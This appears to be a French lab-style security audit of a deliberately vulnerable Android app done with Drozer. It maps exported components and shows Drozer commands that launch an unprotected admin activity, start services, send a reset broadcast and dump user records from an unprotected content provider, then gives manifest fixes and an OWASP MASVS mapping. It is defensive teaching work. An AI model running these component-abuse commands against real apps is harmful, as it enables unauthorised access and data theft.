🔐 Audit de Sécurité Android — VulnerableApp

![Security Audit](https://img.shields.io/badge/Type-Security%20Audit-red?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Android-green?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-Drozer-blue?style=flat-square)
![Vulns](https://img.shields.io/badge/Vulnérabilités-7-critical?style=flat-square&color=red)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=flat-square)
![OWASP](https://img.shields.io/badge/Standard-OWASP%20MASVS-orange?style=flat-square)

---

## 📋 Informations générales

| Champ | Valeur |
|---|---|
| **Application** | VulnerableApp |
| **Package** | `com.example.vulnerableapp` |
| **Version** | 1.0 |
| **Outil principal** | Drozer |
| **Environnement** | Émulateur Android (AVD) |
| **Méthodologie** | Analyse statique du manifeste + cartographie des composants exposés + analyse des risques |
| **Standard** | OWASP MASVS |

---

## 🎯 Résumé exécutif

L'audit a révélé **7 vulnérabilités** sur l'ensemble des composants Android de l'application, dont **2 critiques**. Les problèmes les plus graves concernent un Content Provider exposant des données utilisateur (dont des hash de mots de passe) sans aucune permission, et une activité d'administration accessible sans authentification.

| Sévérité | Nombre |
|---|---|
| 🔴 Critique | 2 |
| 🟠 Élevé | 3 |
| 🟡 Moyen | 2 |
| 🟢 Faible | 0 |

---

## ⚙️ Étape 1 — Connexion Drozer

```bash
# Lancement de la console Drozer
drozer console connect

# Vérification de la connexion
dz> device
dz> run information.device

# Liste des modules disponibles
dz> list
```

**✅ Check your work :**
- La console Drozer est connectée à l'émulateur
- Les commandes `dz>` s'exécutent correctement
- Les informations de l'appareil s'affichent

---

## 🗺️ Étape 2 — Analyse du Manifeste

```bash
dz> run app.package.manifest com.example.vulnerableapp
dz> run app.package.info -a com.example.vulnerableapp
```

### Permissions dangereuses détectées

| Permission | Niveau | Justification |
|---|---|---|
| `READ_CONTACTS` | Dangerous | Utilisée comme permission sur une activité (insuffisant) |
| `WRITE_EXTERNAL_STORAGE` | Dangerous | Stockage externe |
| `ACCESS_FINE_LOCATION` | Dangerous | Géolocalisation précise |
| `READ_SMS` | Dangerous | ⚠️ Non justifiée par les fonctionnalités |

### Flags de sécurité manquants

```xml
android:allowBackup="true"        
android:usesCleartextTraffic      
android:networkSecurityConfig     
```

### Récapitulatif des composants exposés
Activities  exportées : 3 / 5  (dont 2 sans permission adéquate)
Services    exportés  : 2 / 3  (dont 2 sans aucune permission)
Receivers   exportés  : 2 / 3  (dont 2 avec actions custom non protégées)
Providers   exportés  : 2 / 2  (dont 2 sans permission lecture/écriture)

---

## 🏃 Étape 3 — Cartographie des Activities

```bash
dz> run app.activity.info -a com.example.vulnerableapp -i
```

**Output :**
com.example.vulnerableapp.LoginActivity         → exported=true  | Permission: null  | [LAUNCHER — OK]
com.example.vulnerableapp.UserProfileActivity   → exported=true  | Permission: READ_CONTACTS [WEAK]
com.example.vulnerableapp.AdminPanelActivity    → exported=true  | Permission: null  | [CRITIQUE]
com.example.vulnerableapp.SettingsActivity      → exported=false | [OK]
com.example.vulnerableapp.SplashActivity        → exported=false | [OK]

**Exploitation — AdminPanelActivity :**
```bash
dz> run app.activity.start --component com.example.vulnerableapp \
    com.example.vulnerableapp.AdminPanelActivity

# Résultat : Activity launched — panneau admin accessible sans auth
```

---

## ⚙️ Étape 4 — Cartographie des Services

```bash
dz> run app.service.info -a com.example.vulnerableapp
```

**Output :**
com.example.vulnerableapp.DataSyncService       → exported=true  | Permission: null [VULNÉRABLE]
com.example.vulnerableapp.AuthTokenService      → exported=true  | Permission: null [CRITIQUE]
com.example.vulnerableapp.BackgroundMonitor     → exported=false | [OK]

**Exploitation — DataSyncService :**
```bash
dz> run app.service.start --component com.example.vulnerableapp \
    com.example.vulnerableapp.DataSyncService

# Résultat : Service started — synchronisation déclenchée sans authentification
```

---

## 📡 Étape 5 — Cartographie des Broadcast Receivers

```bash
dz> run app.broadcast.info -a com.example.vulnerableapp
```

**Output :**
com.example.vulnerableapp.BootReceiver
→ exported=true | Permission: null
→ Actions: BOOT_COMPLETED, com.example.vulnerableapp.RESET_APP [DANGEROUS]
com.example.vulnerableapp.NetworkChangeReceiver
→ exported=true | Permission: null
→ Actions: CONNECTIVITY_CHANGE, com.example.vulnerableapp.FORCE_SYNC [DANGEROUS]

**Exploitation — BootReceiver :**
```bash
dz> run app.broadcast.send --action com.example.vulnerableapp.RESET_APP \
    --component com.example.vulnerableapp com.example.vulnerableapp.BootReceiver

# Résultat : App reset triggered without user interaction
```

---

## 🗄️ Étape 6 — Cartographie des Content Providers

```bash
dz> run app.provider.info -a com.example.vulnerableapp -p
dz> run scanner.provider.finduris -a com.example.vulnerableapp
dz> run app.provider.query content://com.example.vulnerableapp.provider/users
```

**Output — Permissions :**
com.example.vulnerableapp.UserDataProvider
Authority    : com.example.vulnerableapp.provider
Read Perm    : null   ← PAS DE PERMISSION
Write Perm   : null   ← PAS DE PERMISSION
Exported     : true

**Output — URIs accessibles :**
content://com.example.vulnerableapp.provider/users
content://com.example.vulnerableapp.provider/credentials
content://com.example.vulnerableapp.provider/sessions
content://com.example.vulnerableapp.cache/temp_data

**Output — Exploitation (lecture des users) :**
_idusernameemailpassword_hashlast_login1adminadmin@example.com2b$10
abc123...2024-01-15 09:32:112john.doejohn@example.com2b$10
xyz789...2024-01-14 17:45:033jane.smithjane@example.com2b$10
def456...2024-01-15 11:20:55
[!] CRITIQUE : 3 utilisateurs exposés sans aucune permission

---

## 🚨 Tableau de triage complet

| ID | Composant | Vulnérabilité | Confiance | Sévérité | Impact | Recommandation | Statut |
|---|---|---|---|---|---|---|---|
| V1 | `LoginActivity` | Exportée sans protection | Élevée | Info | Aucun (normal) | Conserver tel quel | ✅ OK |
| V2 | `AdminPanelActivity` | Exportée sans permission | Élevée | **Critique** | Accès admin sans auth | `exported=false` | ❌ À corriger |
| V3 | `UserProfileActivity` | Permission `READ_CONTACTS` trop faible | Élevée | Moyen | Accès données profil | Permission `signature` | ❌ À corriger |
| V4 | `UserDataProvider` | URI accessibles sans permission | Élevée | **Critique** | Fuite de données utilisateur | Ajouter `readPermission`/`writePermission` | ❌ À corriger |
| V5 | `DataSyncService` | Service exporté sans validation | Élevée | Élevé | Sync non autorisée | `exported=false` | ❌ À corriger |
| V6 | `AuthTokenService` | Service exporté sans permission | Élevée | Élevé | Manipulation de tokens | `exported=false` | ❌ À corriger |
| V7 | `BootReceiver` | Action custom sans permission | Élevée | Élevé | Reset forcé de l'app | Ajouter `android:permission` | ❌ À corriger |

---

## 🛠️ Corrections recommandées

### 1. AdminPanelActivity
```xml
<!-- Avant -->
<activity android:name=".AdminPanelActivity" android:exported="true" />
<!-- Après -->
<activity android:name=".AdminPanelActivity" android:exported="false" />
```

### 2. UserProfileActivity
```xml
<!-- Avant -->
<activity android:name=".UserProfileActivity"
    android:exported="true"
    android:permission="android.permission.READ_CONTACTS" />
<!-- Après -->
<activity android:name=".UserProfileActivity" android:exported="false" />
```

### 3. UserDataProvider
```xml
<!-- Avant -->
<provider android:name=".UserDataProvider"
    android:authorities="com.example.vulnerableapp.provider"
    android:exported="true" />
<!-- Après -->
<provider android:name=".UserDataProvider"
    android:authorities="com.example.vulnerableapp.provider"
    android:exported="false"
    android:readPermission="com.example.vulnerableapp.permission.READ_DATA"
    android:writePermission="com.example.vulnerableapp.permission.WRITE_DATA" />
```

### 4. Services
```xml
<!-- Avant -->
<service android:name=".DataSyncService" android:exported="true" />
<service android:name=".AuthTokenService" android:exported="true" />
<!-- Après -->
<service android:name=".DataSyncService" android:exported="false" />
<service android:name=".AuthTokenService" android:exported="false" />
```

### 5. BootReceiver
```xml
<!-- Avant -->
<receiver android:name=".BootReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
        <action android:name="com.example.vulnerableapp.RESET_APP" />
    </intent-filter>
</receiver>
<!-- Après -->
<receiver android:name=".BootReceiver"
    android:exported="true"
    android:permission="com.example.vulnerableapp.permission.BOOT">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

---

## ⚠️ Analyse des risques par composant

### 1. Activities exportées sans protection
- **Risque** : Accès non autorisé à des écrans sensibles
- **Scénario** : Un attaquant lance directement `AdminPanelActivity`, contournant l'authentification

### 2. Services exportés sans protection
- **Risque** : Exécution de fonctionnalités sensibles
- **Scénario** : Un attaquant démarre `AuthTokenService` pour manipuler les sessions

### 3. Broadcast Receivers exportés
- **Risque** : Déclenchement d'actions non autorisées
- **Scénario** : Envoi d'un intent malveillant `RESET_APP` pour réinitialiser l'application

### 4. Content Providers mal protégés
- **Risque** : Accès non autorisé aux données
- **Scénario** : Lecture de `content://...provider/credentials` sans aucune permission requise

### 5. Permissions insuffisantes
- **Risque** : Protection inadéquate des composants sensibles
- **Scénario** : `UserProfileActivity` protégée par `READ_CONTACTS` — accessible à trop d'apps

---

## 📁 Structure des preuves
/preuves/
├── /activities/
│   ├── exported_activities.txt
│   └── activity_risks.md
├── /services/
│   ├── exported_services.txt
│   └── service_risks.md
├── /receivers/
│   ├── exported_receivers.txt
│   └── receiver_risks.md
├── /providers/
│   ├── exported_providers.txt
│   └── provider_risks.md
└── /manifest/
└── manifest_analysis.md

---

## 🗺️ Mapping OWASP MASVS

| ID | Composant | Catégorie MASVS | Contrôle MSTG |
|---|---|---|---|
| V2 | AdminPanelActivity | MASVS-PLATFORM-1 | MSTG-PLATFORM-1 |
| V3 | UserProfileActivity | MASVS-PLATFORM-1 | MSTG-PLATFORM-1 |
| V4 | UserDataProvider | MASVS-STORAGE-2 | MSTG-STORAGE-6 |
| V5 | DataSyncService | MASVS-PLATFORM-1 | MSTG-PLATFORM-2 |
| V6 | AuthTokenService | MASVS-AUTH-1 | MSTG-AUTH-1 |
| V7 | BootReceiver | MASVS-PLATFORM-1 | MSTG-PLATFORM-3 |

---

## ✅ Checklist de fin d'audit

### Conformité de l'audit
- [x] Toutes les étapes du lab ont été suivies
- [x] Tous les composants Android ont été analysés (activities, services, receivers, providers)
- [x] Le tableau de triage est complet (7 vulnérabilités documentées)
- [x] Les remédiations proposées sont spécifiques et applicables
- [x] Le mapping OWASP MASVS est correct

### Absence de données sensibles
- [x] Aucune donnée utilisateur réelle n'est présente dans le rapport
- [x] Aucun mot de passe ou clé réelle n'est inclus dans le rapport
- [x] Les captures d'écran ne contiennent pas d'informations sensibles
- [x] Les chemins système complets ont été anonymisés
- [x] Les identifiants personnels ont été supprimés

### Qualité du rapport
- [x] Le rapport est bien structuré
- [x] Les vulnérabilités sont clairement expliquées avec scénarios d'exploitation
- [x] Les recommandations sont précises et actionnables (code avant/après)
- [x] La documentation est complète
- [x] Le format des livrables est conforme aux attentes

---

## 📚 Annexes

- **Annexe A** : Tableau de triage complet (voir section ci-dessus)
- **Annexe B** : Dossier `/preuves/` avec tous les outputs Drozer
- **Annexe C** : Mapping OWASP MASVS (voir section ci-dessus)
